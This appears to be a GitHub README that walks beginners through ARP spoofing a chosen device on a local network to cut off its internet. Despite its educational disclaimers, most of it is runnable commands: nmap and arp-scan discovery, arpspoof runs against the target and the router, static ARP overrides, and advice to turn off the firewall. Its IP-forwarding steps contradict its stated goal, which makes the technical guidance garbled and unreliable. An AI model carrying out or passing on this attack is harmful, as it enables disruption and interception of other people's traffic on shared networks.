> ## 👋 Start Here
> An educational ARP-spoofing guide. **For users:** learn what ARP spoofing means, why local networks can be affected, and how defenders can detect and prevent it. Use hands-on experiments only in an isolated lab you control.
>
> **Safety:** Use security, camera, and network features only on systems and networks you own or are explicitly authorized to test.

---

# How-to-use-arpspoof

# 🛡️ Easy Guide: How to Block Someone’s Internet on Your LAN  
**Author:** Mr-A-Hacker  
**Purpose:** Teach beginners how ARP spoofing works in a safe, local network  
**Status:** For learning only — don’t use this to mess with people  

---

## 🎯 What’s This About?  
This guide shows you how to **trick a device** on your network so it loses internet. You do this by **sending fake messages** that confuse it about who the router is. This is called **ARP spoofing**. It’s like telling someone “I’m the Wi-Fi” when you’re not.

This is **only for learning**. Don’t use it on real networks or without permission.

---

## 🧰 What You Need  

- ✅ You and the target must be on the **same Wi-Fi or LAN**  
- ✅ You need the **target’s IP address** (like `192.168.2.181`)  
- ✅ You need a tool called `arpspoof`  
- ✅ You need to turn on something called **IP forwarding**  
- ✅ You need to know your **network interface** (like `eth0` or `wlan0`)  

To turn on IP forwarding, run this:  
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

## 🧭 Step-by-Step: How to Do It  

### 1. 🔍 Find Devices on the Network  
Run one of these to see who’s online:  
```bash
arp-scan -l
nmap -sn 192.168.2.0/24
```

### 2. 🎯 Trick the Target  
Make the target think **you** are the router:  
```bash
arpspoof -i eth0 -t 192.168.2.181 192.168.2.1
```

### 3. 🔁 Trick the Router  
Make the router think **you** are the target:  
```bash
arpspoof -i eth0 -t 192.168.2.1 192.168.2.181
```

### 4. 🔄 Turn On IP Forwarding  
Let traffic flow through your computer:  
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 5. 🧪 (Optional) Force a Fake MAC Address  
If the target won’t update its info, force it:  
```bash
arp -s 192.168.2.181 AA:BB:CC:EE:FF:11
```

Or use a custom tool:  
```bash
subarp -i eth0 -s 192.168.2.181 AA:BB:CC:EE:FF:11
```

### 6. 🧹 Clear the Network Cache  
Make sure old info is gone:  
```bash
ip -s -s neigh flush all
```

---

## ⚠️ Problems You Might Hit  

| Problem | What to Try |
|--------|-------------|
| Nothing’s happening | Run `ip -s -s neigh flush all` |
| Wrong interface | Try `wlan0` instead of `eth0` |
| Internet still works | Make sure IP forwarding is on |
| Firewall blocks you | Turn it off or change settings |
| Static entries | Use `arp -s` or `subarp` to override |

---

## 🧪 Safe Testing Tips  
Only test this in a **virtual machine** or a **private lab**. Never use it on public Wi-Fi or school/work networks. This is for **learning**, not for messing with people.

---

## 🧠 Why This Matters  
ARP spoofing teaches you how networks trust devices — and how that trust can be broken. This guide is for:

- ✅ Learning how spoofing works  
- ✅ Practicing in safe environments  
- ✅ Understanding how to defend against it  

Always get permission. Always be ethical.

---

## 📜 Legacy Message  
This guide is part of Mr-A-Hacker’s mission to teach hacking in a **safe, dramatic, and smart** way. Every command here is meant to be **understood**, not just copied.

If you share or remix this, give credit. This isn’t just a script — it’s a legacy.

---

## 🔗 Follow Me on GitHub  
Want more beginner-friendly hacking guides? Follow me here:  
👉 [github.com/Mr-A-Hacker](https://github.com/Mr-A-Hacker)
